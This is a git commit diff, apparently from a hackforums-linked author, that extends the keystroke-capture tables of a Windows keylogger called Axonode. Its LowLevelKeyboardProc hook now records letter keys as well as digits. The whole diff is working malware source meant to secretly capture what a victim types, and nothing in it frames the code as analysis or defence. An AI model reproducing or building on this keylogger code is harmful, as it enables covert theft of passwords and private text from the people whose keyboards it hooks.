3943b4a23946138b6ac03779535ddf6c77a1bb03
TachyonRSA <tachyon@hackforums.org>
2017-06-09 09:16:14 +0200

    - Added more keys to keylogger.

--- Axonode/Axonode/Axonode.cpp
+++ Axonode/Axonode/Axonode.cpp
@@ -14,18 +14,19 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	BOOL inKey = FALSE;
 	DWORD SHIFT_key = 0;
-	unsigned int vCode[40] = {0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39};
-	char lowCase[40] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9'};
-	char upCase[40] = {')', '!', '@', '#', '$', '%', '^', '&', '*', '('};
+	unsigned int vCode[40] = {0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E,
+	0x4F, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A};
+	char lowCase[40] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's',
+	't', 'u', 'v', 'w', 'x', 'y', 'z'};
+	char upCase[40] = {')', '!', '@', '#', '$', '%', '^', '&', '*', '(', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S',
+	'T', 'U', 'V', 'W', 'X', 'Y', 'Z' };
 
 	
 	if ((nCode == HC_ACTION) && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
 	{
 		PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
 
-		SHIFT_key = GetAsyncKeyState(VK_SHIFT);
-
-		for (int i = 0; i < 40; i++)
+		for (int i = 0; i < ( sizeof(vCode) / sizeof(vCode[0]) ); i++)
 		{
 			if (p->vkCode == vCode[i])
 			{
